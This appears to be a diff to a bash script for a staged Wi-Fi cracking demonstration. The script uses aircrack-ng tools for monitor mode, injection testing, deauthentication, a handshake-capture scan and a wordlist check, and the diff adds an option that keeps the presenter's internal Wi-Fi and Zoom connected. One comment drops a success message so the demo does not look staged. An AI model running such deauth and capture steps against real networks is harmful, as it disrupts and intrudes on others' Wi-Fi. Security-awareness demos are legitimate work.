@@ -26,6 +26,10 @@ DEAUTH_EVERY=5                        # deauth once per N rounds, then LISTEN �
 # Realtek out-of-tree drivers (e.g. RTL8814AU) often report "channel -1"; this
 # flag makes aireplay-ng proceed anyway. Harmless on drivers that don't need it.
 AIREPLAY_OPTS="--ignore-negative-one"
+# ISOLATE_ADAPTER=1: only take the USB adapter out of NetworkManager and into
+# monitor mode, leaving the internal NIC connected (so Zoom/screen-share survives).
+# Set to 0 for the old behavior (kill NetworkManager entirely -> all Wi-Fi drops).
+ISOLATE_ADAPTER=1
 
 WORKDIR="$(mktemp -d /tmp/wpa-demo.XXXXXX)"
 CAPBASE="$WORKDIR/handshake"
@@ -42,7 +46,11 @@ die()  { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; exit 1; }
 MON=""
 BASE_IFACE=""
 NM_WAS_ACTIVE=0
+ADAPTER_UNMANAGED=0
 CLEANED=0
+
+# True if $1 is a USB-attached network interface (adapter, not internal NIC).
+is_usb_iface() { readlink -f "/sys/class/net/$1/device" 2>/dev/null | grep -qi usb; }
 
 cleanup() {
   [ "$CLEANED" -eq 1 ] && return   # idempotent: EXIT + a signal must not double-run
@@ -53,8 +61,20 @@ cleanup() {
   [ -n "${ADPID:-}" ] && kill -9 "$ADPID" 2>/dev/null
   pkill -9 -x airodump-ng 2>/dev/null
   pkill -9 -x aireplay-ng 2>/dev/null
-  [ -n "$MON" ] && airmon-ng stop "$MON" >/dev/null 2>&1
-  # ALWAYS bring networking back, no matter how we got here.
+  # Restore the radio(s).
+  if [ "$ISOLATE_ADAPTER" -eq 1 ] && [ -n "$MON" ]; then
+    # Isolation mode: hand ONLY the adapter back to NetworkManager (do this even if
+    # the unmanage step reported failure, since 'iw set type monitor' unmanages it
+    # anyway). The internal NIC was never touched, so Zoom stayed up throughout.
+    ip link set "$MON" down 2>/dev/null
+    iw dev "$MON" set type managed 2>/dev/null
+    ip link set "$MON" up 2>/dev/null
+    command -v nmcli >/dev/null 2>&1 && nmcli device set "$MON" managed yes >/dev/null 2>&1
+    warn "Adapter $MON returned to NetworkManager (internal Wi-Fi was untouched)."
+  else
+    [ -n "$MON" ] && airmon-ng stop "$MON" >/dev/null 2>&1
+  fi
+  # Full-kill mode only: bring the whole service back.
   if [ "$NM_WAS_ACTIVE" -eq 1 ]; then
     systemctl restart NetworkManager >/dev/null 2>&1
     warn "NetworkManager restarted — normal Wi-Fi should return shortly."
@@ -74,12 +94,35 @@ for bin in airmon-ng airodump-ng aireplay-ng aircrack-ng python3; do
   command -v "$bin" >/dev/null 2>&1 || die "Missing '$bin' (install aircrack-ng / python3)."
 done
 
-# Pick the wireless interface
+# Pick the wireless interface.
 BASE_IFACE="${1:-}"
 if [ -z "$BASE_IFACE" ]; then
-  BASE_IFACE="$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2; exit}')"
+  if [ "$ISOLATE_ADAPTER" -eq 1 ]; then
+    # Isolation mode: use the USB adapter, never the internal NIC. Auto-pick the
+    # (single) USB wireless interface; if 0 or >1, make the user name it.
+    USB_IFACES=""
+    for d in $(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}'); do
+      is_usb_iface "$d" && USB_IFACES="$USB_IFACES $d"
+    done
+    set -- $USB_IFACES
+    if [ "$#" -eq 1 ]; then
+      BASE_IFACE="$1"
+    elif [ "$#" -eq 0 ]; then
+      die "No USB wireless adapter found. Plug it in, or pass the interface: sudo $0 <iface>"
+    else
+      die "Multiple USB wireless adapters ($*). Name the one to use: sudo $0 <iface>"
+    fi
+  else
+    BASE_IFACE="$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2; exit}')"
+  fi
 fi
-[ -n "$BASE_IFACE" ] || die "No wireless interface found. Pass one: sudo $0 wlan0"
+[ -n "$BASE_IFACE" ] || die "No wireless interface found. Pass one: sudo $0 <iface>"
+
+# Safety: in isolation mode, refuse to attack over a non-USB (likely internal) NIC,
+# since that's the one carrying Zoom. Override by setting ISOLATE_ADAPTER=0.
+if [ "$ISOLATE_ADAPTER" -eq 1 ] && ! is_usb_iface "$BASE_IFACE"; then
+  die "$BASE_IFACE is not a USB adapter. In isolation mode that's likely your internal NIC (Zoom). Pass the USB adapter, or set ISOLATE_ADAPTER=0 to override."
+fi
 say "Using wireless interface: $BASE_IFACE"
 
 # ---------------------------------------------------------------------------
@@ -113,50 +156,68 @@ with open(outpath, "w") as f:
 print(f"{len(out)} candidates written")
 PY
 [ -s "$WORDLIST" ] || die "Wordlist generation failed."
-if grep -qxF "$TARGET_PASS" "$WORDLIST"; then
-  say "Sanity check: target password IS in the wordlist. Good."
-else
+# Silent pre-flight check: only speak up if the passphrase ISN'T reachable (which
+# would mean the crack is doomed). No success message — it shouldn't look staged.
+if ! grep -qxF "$TARGET_PASS" "$WORDLIST"; then
   warn "Target password not found in wordlist — the crack will fail. Check the QUOTE."
 fi
 
 # ---------------------------------------------------------------------------
 # 2. Monitor mode
 # ---------------------------------------------------------------------------
-say "Enabling monitor mode (this drops the host's Wi-Fi/internet — expected)"
-if systemctl is-active --quiet NetworkManager; then NM_WAS_ACTIVE=1; fi
-airmon-ng check kill >/dev/null 2>&1
-
 detect_mon() {
   iw dev 2>/dev/null | awk '/Interface/{i=$2} /type monitor/{print i; exit}'
 }
 
-# Attempt 1: airmon-ng (keep its output so real errors are visible)
-AIRMON_OUT="$(airmon-ng start "$BASE_IFACE" 2>&1)"
-MON="$(detect_mon)"
-
-# Attempt 2: manual monitor mode via iw, in case airmon-ng didn't switch it
-if [ -z "$MON" ]; then
-  warn "airmon-ng didn't produce a monitor interface — trying manual iw method."
-  # after 'check kill' the base iface may have been renamed (e.g. wlan0 -> wlan0mon);
-  # re-resolve any managed/monitor-capable interface still present.
-  CAND="$BASE_IFACE"
-  ip link show "$CAND" >/dev/null 2>&1 || \
-    CAND="$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2; exit}')"
-  if [ -n "$CAND" ]; then
-    ip link set "$CAND" down 2>/dev/null
-    iw dev "$CAND" set type monitor 2>/dev/null
-    ip link set "$CAND" up 2>/dev/null
-    MON="$(detect_mon)"
-    [ -n "$MON" ] || { [ "$(iw dev "$CAND" info 2>/dev/null | awk '/type/{print $2}')" = "monitor" ] && MON="$CAND"; }
+if [ "$ISOLATE_ADAPTER" -eq 1 ]; then
+  # ---- Isolation mode: touch ONLY the adapter; internal NIC (Zoom) stays up ----
+  say "Isolating $BASE_IFACE from NetworkManager (internal Wi-Fi stays connected)"
+  # Try to release the adapter from NM. On setups where NM doesn't manage it at
+  # all (common for USB adapters -> "Device not found"), this is a harmless no-op;
+  # switching to monitor mode is enough to keep NM off it. Stay quiet either way.
+  if command -v nmcli >/dev/null 2>&1; then
+    nmcli device set "$BASE_IFACE" managed no >/dev/null 2>&1 && ADAPTER_UNMANAGED=1
   fi
-fi
+  # Put just this adapter into monitor mode via iw.
+  ip link set "$BASE_IFACE" down 2>/dev/null
+  iw dev "$BASE_IFACE" set type monitor 2>/dev/null
+  ip link set "$BASE_IFACE" up 2>/dev/null
+  MON="$BASE_IFACE"
+  if [ "$(iw dev "$MON" info 2>/dev/null | awk '/type/{print $2}')" != "monitor" ]; then
+    die "Could not put $MON into monitor mode. Confirm it supports monitor: iw phy | grep -A12 'interface modes'."
+  fi
+else
+  # ---- Full-kill mode: stop NetworkManager entirely (all Wi-Fi drops) ----
+  say "Enabling monitor mode (this drops the host's Wi-Fi/internet — expected)"
+  if systemctl is-active --quiet NetworkManager; then NM_WAS_ACTIVE=1; fi
+  airmon-ng check kill >/dev/null 2>&1
 
-if [ -z "$MON" ]; then
-  echo "----- airmon-ng output -----" >&2
-  echo "$AIRMON_OUT" >&2
-  echo "----- current radios -------" >&2
-  iw dev >&2 2>/dev/null
-  die "Could not enter monitor mode. See output above. Common cause: the built-in card doesn't support monitor/injection — use a USB adapter that does (e.g. Alfa AWUS036)."
+  # Attempt 1: airmon-ng (keep its output so real errors are visible)
+  AIRMON_OUT="$(airmon-ng start "$BASE_IFACE" 2>&1)"
+  MON="$(detect_mon)"
+
+  # Attempt 2: manual monitor mode via iw, in case airmon-ng didn't switch it
+  if [ -z "$MON" ]; then
+    warn "airmon-ng didn't produce a monitor interface — trying manual iw method."
+    CAND="$BASE_IFACE"
+    ip link show "$CAND" >/dev/null 2>&1 || \
+      CAND="$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2; exit}')"
+    if [ -n "$CAND" ]; then
+      ip link set "$CAND" down 2>/dev/null
+      iw dev "$CAND" set type monitor 2>/dev/null
+      ip link set "$CAND" up 2>/dev/null
+      MON="$(detect_mon)"
+      [ -n "$MON" ] || { [ "$(iw dev "$CAND" info 2>/dev/null | awk '/type/{print $2}')" = "monitor" ] && MON="$CAND"; }
+    fi
+  fi
+
+  if [ -z "$MON" ]; then
+    echo "----- airmon-ng output -----" >&2
+    echo "$AIRMON_OUT" >&2
+    echo "----- current radios -------" >&2
+    iw dev >&2 2>/dev/null
+    die "Could not enter monitor mode. See output above. Common cause: the built-in card doesn't support monitor/injection — use a USB adapter that does (e.g. Alfa AWUS036)."
+  fi
 fi
 say "Monitor interface: $MON"
 
@@ -165,16 +226,14 @@ say "Monitor interface: $MON"
 # NOTE: this test is only meaningful on the AP's channel — a blind, channel-hopping
 # test reports false negatives on cards that inject fine. Park on CHAN first, and
 # test against the (fallback) BSSID so it exercises a real AP.
-say "Testing packet injection on channel $CHAN (needed for the deauth step)"
 iw dev "$MON" set channel "$CHAN" 2>/dev/null
 if aireplay-ng --test $AIREPLAY_OPTS -a "$FALLBACK_BSSID" "$MON" 2>&1 | grep -qi "Injection is working"; then
-  say "Injection works — targeted deauth will function."
+  say "Injection OK — automated deauth enabled."
 else
-  warn "Injection test FAILED/inconclusive. This is often a false negative; capture"
-  warn "may still work, and deauth may still force a reconnect. Verify manually with:"
-  warn "  sudo iw dev $MON set channel $CHAN"
-  warn "  sudo aireplay-ng --test $AIREPLAY_OPTS -a $FALLBACK_BSSID $MON"
-  warn "Continuing anyway..."
+  # Realtek's --test often reports a false negative even when deauth works; if it
+  # genuinely can't inject, the manual phone-toggle path still captures. Either way
+  # this is not a failure, so keep it to a single neutral line.
+  say "Injection test inconclusive (common on this adapter) — deauth may still work; manual reconnect is the fallback."
 fi
 
 # ---------------------------------------------------------------------------
@@ -182,8 +241,10 @@ fi
 # ---------------------------------------------------------------------------
 say "Scanning ~15s for SSID: $TARGET_SSID"
 # -k 5: if airodump ignores SIGTERM at 15s (common on Realtek drivers), send
-# SIGKILL 5s later so this step can never hang forever.
-timeout -k 5 15 airodump-ng --output-format csv -w "$SCANBASE" "$MON" >/dev/null 2>&1
+# SIGKILL 5s later so this step can never hang forever. Run it backgrounded and
+# wait on it so the shell's "Killed" job notice doesn't clutter the demo output.
+timeout -k 5 15 airodump-ng --output-format csv -w "$SCANBASE" "$MON" >/dev/null 2>&1 &
+wait "$!" 2>/dev/null
 pkill -9 -x airodump-ng 2>/dev/null   # belt-and-suspenders: reap any straggler
 CSV="$(ls -1 "${SCANBASE}"-*.csv 2>/dev/null | head -1)"
 BSSID=""
